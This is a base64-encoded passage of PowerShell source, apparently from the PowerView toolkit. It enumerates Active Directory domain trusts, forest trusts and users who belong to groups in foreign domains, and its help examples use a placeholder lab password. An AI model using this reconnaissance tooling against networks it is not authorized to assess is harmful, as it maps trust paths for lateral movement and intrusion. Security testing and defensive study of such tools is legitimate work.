CAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgICAgICAgICAkU291cmNlRG9tYWluID0gKEdldC1Eb21haW4gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwpLk5hbWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRTb3VyY2VEb21haW4gPSAoR2V0LURvbWFpbikuTmFtZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICAkTmV0U2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJFNvdXJjZURvbWFpbgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJE5ldFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBpZiAoJERvbWFpbiAtYW5kICREb21haW4uVHJpbSgpIC1uZSAnJykgewogICAgICAgICAgICAgICAgJFNvdXJjZURvbWFpbiA9ICREb21haW4KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRTb3VyY2VEb21haW4gPSAkRW52OlVTRVJETlNET01BSU4KICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgaWYgKCRQc0NtZGxldC5QYXJhbWV0ZXJTZXROYW1lIC1lcSAnTERBUCcpIHsKICAgICAgICAgICAgIyBpZiB3ZSdyZSBzZWFyY2hpbmcgZm9yIGRvbWFpbiB0cnVzdHMgdGhyb3VnaCBMREFQL0FEU0kKICAgICAgICAgICAgJFRydXN0U2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQExkYXBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICAkU291cmNlU0lEID0gR2V0LURvbWFpblNJRCBATmV0U2VhcmNoZXJBcmd1bWVudHMKCiAgICAgICAgICAgIGlmICgkVHJ1c3RTZWFyY2hlcikgewoKICAgICAgICAgICAgICAgICRUcnVzdFNlYXJjaGVyLkZpbHRlciA9ICcob2JqZWN0Q2xhc3M9dHJ1c3RlZERvbWFpbiknCgogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRmluZE9uZSddKSB7ICRSZXN1bHRzID0gJFRydXN0U2VhcmNoZXIuRmluZE9uZSgpIH0KICAgICAgICAgICAgICAgIGVsc2UgeyAkUmVzdWx0cyA9ICRUcnVzdFNlYXJjaGVyLkZpbmRBbGwoKSB9CiAgICAgICAgICAgICAgICAkUmVzdWx0cyB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICRQcm9wcyA9ICRfLlByb3BlcnRpZXMKICAgICAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3QgPSBOZXctT2JqZWN0IFBTT2JqZWN0CgogICAgICAgICAgICAgICAgICAgICRUcnVzdEF0dHJpYiA9IEAoKQogICAgICAgICAgICAgICAgICAgICRUcnVzdEF0dHJpYiArPSAkVHJ1c3RBdHRyaWJ1dGVzLktleXMgfCBXaGVyZS1PYmplY3QgeyAkUHJvcHMudHJ1c3RhdHRyaWJ1dGVzWzBdIC1iYW5kICRfIH0gfCBGb3JFYWNoLU9iamVjdCB7ICRUcnVzdEF0dHJpYnV0ZXNbJF9dIH0KCiAgICAgICAgICAgICAgICAgICAgJERpcmVjdGlvbiA9IFN3aXRjaCAoJFByb3BzLnRydXN0ZGlyZWN0aW9uKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIDAgeyAnRGlzYWJsZWQnIH0KICAgICAgICAgICAgICAgICAgICAgICAgMSB7ICdJbmJvdW5kJyB9CiAgICAgICAgICAgICAgICAgICAgICAgIDIgeyAnT3V0Ym91bmQnIH0KICAgICAgICAgICAgICAgICAgICAgICAgMyB7ICdCaWRpcmVjdGlvbmFsJyB9CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0R3VpZCA9IE5ldy1PYmplY3QgR3VpZCBAKCwkUHJvcHMub2JqZWN0Z3VpZFswXSkKICAgICAgICAgICAgICAgICAgICAkVGFyZ2V0U0lEID0gKE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5TZWN1cml0eUlkZW50aWZpZXIoJFByb3BzLnNlY3VyaXR5aWRlbnRpZmllclswXSwwKSkuVmFsdWUKCiAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1NvdXJjZU5hbWUnICRTb3VyY2VEb21haW4KICAgICAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnU291cmNlU0lEJyAkU291cmNlU0lECiAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RhcmdldE5hbWUnICRQcm9wcy5uYW1lWzBdCiAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RhcmdldFNJRCcgJFRhcmdldFNJRAogICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdPYmplY3RHdWlkJyAieyRPYmplY3RHdWlkfSIKICAgICAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVHJ1c3RUeXBlJyAkKCRUcnVzdEF0dHJpYiAtam9pbiAnLCcpCiAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RydXN0RGlyZWN0aW9uJyAiJERpcmVjdGlvbiIKICAgICAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3QuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkRvbWFpblRydXN0LkxEQVAnKQogICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRSZXN1bHRzKSB7CiAgICAgICAgICAgICAgICAgICAgdHJ5IHsgJFJlc3VsdHMuZGlzcG9zZSgpIH0KICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluVHJ1c3RdIEVycm9yIGRpc3Bvc2luZyBvZiB0aGUgUmVzdWx0cyBvYmplY3Q6ICRfIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRUcnVzdFNlYXJjaGVyLmRpc3Bvc2UoKQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoJFBzQ21kbGV0LlBhcmFtZXRlclNldE5hbWUgLWVxICdBUEknKSB7CiAgICAgICAgICAgICMgaWYgd2UncmUgc2VhcmNoaW5nIGZvciBkb21haW4gdHJ1c3RzIHRocm91Z2ggV2luMzIgQVBJIGZ1bmN0aW9ucwogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgewogICAgICAgICAgICAgICAgJFRhcmdldERDID0gJFNlcnZlcgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZiAoJERvbWFpbiAtYW5kICREb21haW4uVHJpbSgpIC1uZSAnJykgewogICAgICAgICAgICAgICAgJFRhcmdldERDID0gJERvbWFpbgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgIyBzZWUgaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9tczY3NTk3Nih2PXZzLjg1KS5hc3B4IGZvciBkZWZhdWx0IE5VTEwgYmVoYXZpb3IKICAgICAgICAgICAgICAgICRUYXJnZXREQyA9ICROdWxsCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICMgYXJndW1lbnRzIGZvciBEc0VudW1lcmF0ZURvbWFpblRydXN0cwogICAgICAgICAgICAkUHRySW5mbyA9IFtJbnRQdHJdOjpaZXJvCgogICAgICAgICAgICAjIDYzID0gRFNfRE9NQUlOX0lOX0ZPUkVTVCArIERTX0RPTUFJTl9ESVJFQ1RfT1VUQk9VTkQgKyBEU19ET01BSU5fVFJFRV9ST09UICsgRFNfRE9NQUlOX1BSSU1BUlkgKyBEU19ET01BSU5fTkFUSVZFX01PREUgKyBEU19ET01BSU5fRElSRUNUX0lOQk9VTkQKICAgICAgICAgICAgJEZsYWdzID0gNjMKICAgICAgICAgICAgJERvbWFpbkNvdW50ID0gMAoKICAgICAgICAgICAgIyBnZXQgdGhlIHRydXN0IGluZm9ybWF0aW9uIGZyb20gdGhlIHRhcmdldCBzZXJ2ZXIKICAgICAgICAgICAgJFJlc3VsdCA9ICROZXRhcGkzMjo6RHNFbnVtZXJhdGVEb21haW5UcnVzdHMoJFRhcmdldERDLCAkRmxhZ3MsIFtyZWZdJFB0ckluZm8sIFtyZWZdJERvbWFpbkNvdW50KQoKICAgICAgICAgICAgIyBMb2NhdGUgdGhlIG9mZnNldCBvZiB0aGUgaW5pdGlhbCBpbnRQdHIKICAgICAgICAgICAgJE9mZnNldCA9ICRQdHJJbmZvLlRvSW50NjQoKQoKICAgICAgICAgICAgIyAwID0gc3VjY2VzcwogICAgICAgICAgICBpZiAoKCRSZXN1bHQgLWVxIDApIC1hbmQgKCRPZmZzZXQgLWd0IDApKSB7CgogICAgICAgICAgICAgICAgIyBXb3JrIG91dCBob3cgbXVjaCB0byBpbmNyZW1lbnQgdGhlIHBvaW50ZXIgYnkgZmluZGluZyBvdXQgdGhlIHNpemUgb2YgdGhlIHN0cnVjdHVyZQogICAgICAgICAgICAgICAgJEluY3JlbWVudCA9ICREU19ET01BSU5fVFJVU1RTOjpHZXRTaXplKCkKCiAgICAgICAgICAgICAgICAjIHBhcnNlIGFsbCB0aGUgcmVzdWx0IHN0cnVjdHVyZXMKICAgICAgICAgICAgICAgIGZvciAoJGkgPSAwOyAoJGkgLWx0ICREb21haW5Db3VudCk7ICRpKyspIHsKICAgICAgICAgICAgICAgICAgICAjIGNyZWF0ZSBhIG5ldyBpbnQgcHRyIGF0IHRoZSBnaXZlbiBvZmZzZXQgYW5kIGNhc3QgdGhlIHBvaW50ZXIgYXMgb3VyIHJlc3VsdCBzdHJ1Y3R1cmUKICAgICAgICAgICAgICAgICAgICAkTmV3SW50UHRyID0gTmV3LU9iamVjdCBTeXN0ZW0uSW50cHRyIC1Bcmd1bWVudExpc3QgJE9mZnNldAogICAgICAgICAgICAgICAgICAgICRJbmZvID0gJE5ld0ludFB0ciAtYXMgJERTX0RPTUFJTl9UUlVTVFMKCiAgICAgICAgICAgICAgICAgICAgJE9mZnNldCA9ICROZXdJbnRQdHIuVG9JbnQ2NCgpCiAgICAgICAgICAgICAgICAgICAgJE9mZnNldCArPSAkSW5jcmVtZW50CgogICAgICAgICAgICAgICAgICAgICRTaWRTdHJpbmcgPSAnJwogICAgICAgICAgICAgICAgICAgICRSZXN1bHQgPSAkQWR2YXBpMzI6OkNvbnZlcnRTaWRUb1N0cmluZ1NpZCgkSW5mby5Eb21haW5TaWQsIFtyZWZdJFNpZFN0cmluZyk7JExhc3RFcnJvciA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQoKICAgICAgICAgICAgICAgICAgICBpZiAoJFJlc3VsdCAtZXEgMCkgewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblRydXN0XSBFcnJvcjogJCgoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSAkTGFzdEVycm9yKS5NZXNzYWdlKSIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdCA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1NvdXJjZU5hbWUnICRTb3VyY2VEb21haW4KICAgICAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RhcmdldE5hbWUnICRJbmZvLkRuc0RvbWFpbk5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RhcmdldE5ldGJpb3NOYW1lJyAkSW5mby5OZXRiaW9zRG9tYWluTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnRmxhZ3MnICRJbmZvLkZsYWdzCiAgICAgICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdQYXJlbnRJbmRleCcgJEluZm8uUGFyZW50SW5kZXgKICAgICAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RydXN0VHlwZScgJEluZm8uVHJ1c3RUeXBlCiAgICAgICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdUcnVzdEF0dHJpYnV0ZXMnICRJbmZvLlRydXN0QXR0cmlidXRlcwogICAgICAgICAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVGFyZ2V0U2lkJyAkU2lkU3RyaW5nCiAgICAgICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdUYXJnZXRHdWlkJyAkSW5mby5Eb21haW5HdWlkCiAgICAgICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuRG9tYWluVHJ1c3QuQVBJJykKICAgICAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgIyBmcmVlIHVwIHRoZSByZXN1bHQgYnVmZmVyCiAgICAgICAgICAgICAgICAkTnVsbCA9ICROZXRhcGkzMjo6TmV0QXBpQnVmZmVyRnJlZSgkUHRySW5mbykKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluVHJ1c3RdIEVycm9yOiAkKChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRSZXN1bHQpLk1lc3NhZ2UpIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAjIGlmIHdlJ3JlIHNlYXJjaGluZyBmb3IgZG9tYWluIHRydXN0cyB0aHJvdWdoIC5ORVQgbWV0aG9kcwogICAgICAgICAgICAkRm91bmREb21haW4gPSBHZXQtRG9tYWluIEBOZXRTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICBpZiAoJEZvdW5kRG9tYWluKSB7CiAgICAgICAgICAgICAgICAkRm91bmREb21haW4uR2V0QWxsVHJ1c3RSZWxhdGlvbnNoaXBzKCkgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgJF8uUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkRvbWFpblRydXN0Lk5FVCcpCiAgICAgICAgICAgICAgICAgICAgJF8KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1Gb3Jlc3RUcnVzdCB7CjwjCi5TWU5PUFNJUwoKUmV0dXJuIGFsbCBmb3Jlc3QgdHJ1c3RzIGZvciB0aGUgY3VycmVudCBmb3Jlc3Qgb3IgYSBzcGVjaWZpZWQgZm9yZXN0LgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRm9yZXN0ICAKCi5ERVNDUklQVElPTgoKVGhpcyBmdW5jdGlvbiB3aWxsIGVudW1lcmF0ZSBkb21haW4gdHJ1c3QgcmVsYXRpb25zaGlwcyBmb3IgdGhlIGN1cnJlbnQgKG9yIGEgcmVtb3RlKQpmb3Jlc3QgdXNpbmcgbnVtYmVyIG9mIG1ldGhvZCB1c2luZyB0aGUgLk5FVCBtZXRob2QgR2V0QWxsVHJ1c3RSZWxhdGlvbnNoaXBzKCkgb24gYQpTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkZvcmVzdCByZXR1cm5lZCBieSBHZXQtRm9yZXN0LgoKLlBBUkFNRVRFUiBGb3Jlc3QKClNwZWNpZmllcyB0aGUgZm9yZXN0IHRvIHF1ZXJ5IGZvciB0cnVzdHMsIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGZvcmVzdC4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4KCi5FWEFNUExFCgpHZXQtRm9yZXN0VHJ1c3QKClJldHVybiBjdXJyZW50IGZvcmVzdCB0cnVzdHMuCgouRVhBTVBMRQoKR2V0LUZvcmVzdFRydXN0IC1Gb3Jlc3QgImV4dGVybmFsLmxvY2FsIgoKUmV0dXJuIHRydXN0cyBmb3IgdGhlICJleHRlcm5hbC5sb2NhbCIgZm9yZXN0LgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1Gb3Jlc3RUcnVzdCAtRm9yZXN0ICJleHRlcm5hbC5sb2NhbCIgLUNyZWRlbnRpYWwgJENyZWQKClJldHVybiB0cnVzdHMgZm9yIHRoZSAiZXh0ZXJuYWwubG9jYWwiIGZvcmVzdCB1c2luZyB0aGUgc3BlY2lmaWVkIGFsdGVybmF0ZSBjcmVkZW5pdGFscy4KCi5PVVRQVVRTCgpQb3dlclZpZXcuRG9tYWluVHJ1c3QuTkVUCgpBIFRydXN0UmVsYXRpb25zaGlwSW5mb3JtYXRpb25Db2xsZWN0aW9uIHJldHVybmVkIHdoZW4gdXNpbmcgLk5FVCBtZXRob2RzIChkZWZhdWx0KS4KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Gb3Jlc3RUcnVzdC5ORVQnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ05hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEZvcmVzdCwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgUFJPQ0VTUyB7CiAgICAgICAgJE5ldEZvcmVzdEFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0ZvcmVzdCddKSB7ICROZXRGb3Jlc3RBcmd1bWVudHNbJ0ZvcmVzdCddID0gJEZvcmVzdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICROZXRGb3Jlc3RBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KCiAgICAgICAgJEZvdW5kRm9yZXN0ID0gR2V0LUZvcmVzdCBATmV0Rm9yZXN0QXJndW1lbnRzCgogICAgICAgIGlmICgkRm91bmRGb3Jlc3QpIHsKICAgICAgICAgICAgJEZvdW5kRm9yZXN0LkdldEFsbFRydXN0UmVsYXRpb25zaGlwcygpIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgJF8uUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkZvcmVzdFRydXN0Lk5FVCcpCiAgICAgICAgICAgICAgICAkXwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LURvbWFpbkZvcmVpZ25Vc2VyIHsKPCMKLlNZTk9QU0lTCgpFbnVtZXJhdGVzIHVzZXJzIHdobyBhcmUgaW4gZ3JvdXBzIG91dHNpZGUgb2YgdGhlIHVzZXIncyBkb21haW4uClRoaXMgaXMgYSBkb21haW4ncyAib3V0Z29pbmciIGFjY2Vzcy4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpbiwgR2V0LURvbWFpblVzZXIgIAoKLkRFU0NSSVBUSU9OCgpVc2VzIEdldC1Eb21haW5Vc2VyIHRvIGVudW1lcmF0ZSBhbGwgdXNlcnMgZm9yIHRoZSBjdXJyZW50IChvciB0YXJnZXQpIGRvbWFpbiwKdGhlbiBjYWxjdWxhdGVzIHRoZSBnaXZlbiB1c2VyJ3MgZG9tYWluIG5hbWUgYmFzZWQgb24gdGhlIHVzZXIncyBkaXN0aW5ndWlzaGVkTmFtZS4KVGhpcyBkb21haW4gbmFtZSBpcyBjb21wYXJlZCB0byB0aGUgcXVlcmllZCBkb21haW4sIGFuZCB0aGUgdXNlciBvYmplY3QgaXMKb3V0cHV0IGlmIHRoZXkgZGlmZmVyLgoKLlBBUkFNRVRFUiBEb21haW4KClNwZWNpZmllcyB0aGUgZG9tYWluIHRvIHVzZSBmb3IgdGhlIHF1ZXJ5LCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIExEQVBGaWx0ZXIKClNwZWNpZmllcyBhbiBMREFQIHF1ZXJ5IHN0cmluZyB0aGF0IGlzIHVzZWQgdG8gZmlsdGVyIEFjdGl2ZSBEaXJlY3Rvcnkgb2JqZWN0cy4KCi5QQVJBTUVURVIgUHJvcGVydGllcwoKU3BlY2lmaWVzIHRoZSBwcm9wZXJ0aWVzIG9mIHRoZSBvdXRwdXQgb2JqZWN0IHRvIHJldHJpZXZlIGZyb20gdGhlIHNlcnZlci4KCi5QQVJBTUVURVIgU2VhcmNoQmFzZQoKVGhlIExEQVAgc291cmNlIHRvIHNlYXJjaCB0aHJvdWdoLCBlLmcuICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiClVzZWZ1bCBmb3IgT1UgcXVlcmllcy4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvLgoKLlBBUkFNRVRFUiBTZWFyY2hTY29wZQoKU3BlY2lmaWVzIHRoZSBzY29wZSB0byBzZWFyY2ggdW5kZXIsIEJhc2UvT25lTGV2ZWwvU3VidHJlZSAoZGVmYXVsdCBvZiBTdWJ0cmVlKS4KCi5QQVJBTUVURVIgUmVzdWx0UGFnZVNpemUKClNwZWNpZmllcyB0aGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuCgouUEFSQU1FVEVSIFNlcnZlclRpbWVMaW1pdAoKU3BlY2lmaWVzIHRoZSBtYXhpbXVtIGFtb3VudCBvZiB0aW1lIHRoZSBzZXJ2ZXIgc3BlbmRzIHNlYXJjaGluZy4gRGVmYXVsdCBvZiAxMjAgc2Vjb25kcy4KCi5QQVJBTUVURVIgU2VjdXJpdHlNYXNrcwoKU3BlY2lmaWVzIGFuIG9wdGlvbiBmb3IgZXhhbWluaW5nIHNlY3VyaXR5IGluZm9ybWF0aW9uIG9mIGEgZGlyZWN0b3J5IG9iamVjdC4KT25lIG9mICdEYWNsJywgJ0dyb3VwJywgJ05vbmUnLCAnT3duZXInLCAnU2FjbCcuCgouUEFSQU1FVEVSIFRvbWJzdG9uZQoKU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2VhcmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmplY3RzLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLkVYQU1QTEUKCkdldC1Eb21haW5Gb3JlaWduVXNlcgoKUmV0dXJuIGFsbCB1c2VycyBpbiB0aGUgY3VycmVudCBkb21haW4gd2hvIGFyZSBpbiBncm91cHMgbm90IGluIHRoZQpjdXJyZW50IGRvbWFpbi4KCi5FWEFNUExFCgpHZXQtRG9tYWluRm9yZWlnblVzZXIgLURvbWFpbiBkZXYudGVzdGxhYi5sb2NhbAoKUmV0dXJuIGFsbCB1c2VycyBpbiB0aGUgZGV2LnRlc3RsYWIubG9jYWwgZG9tYWluIHdobyBhcmUgaW4gZ3JvdXBzIG5vdCBpbiB0aGUKZGV2LnRlc3RsYWIubG9jYWwgZG9tYWluLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1Eb21haW5Gb3JlaWduVXNlciAtRG9tYWluIGRldi50ZXN0bGFiLmxvY2FsIC1TZXJ2ZXIgc2Vjb25kYXJ5LmRldi50ZXN0bGFiLmxvY2FsIC1DcmVkZW50aWFsICRDcmVkCgpSZXR1cm4gYWxsIHVzZXJzIGluIHRoZSBkZXYudGVzdGxhYi5sb2NhbCBkb21haW4gd2hvIGFyZSBpbiBncm91cHMgbm90IGluIHRoZQpkZXYudGVzdGxhYi5sb2NhbCBkb21haW4sIGJpbmRpbmcgdG8gdGhlIHNlY29uZGFyeS5kZXYudGVzdGxhYi5sb2NhbCBmb3IgcXVlcmllcywgYW5kCnVzaW5nIHRoZSBzcGVjaWZpZWQgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzLgoKLk9VVFBVVFMKClBvd2VyVmlldy5Gb3JlaWduVXNlcgoKQ3VzdG9tIFBTT2JqZWN0IHdpdGggdHJhbnNsYXRlZCB1c2VyIHByb3BlcnR5IGZpZWxkcy4KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Gb3JlaWduVXNlcicpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnTmFtZSc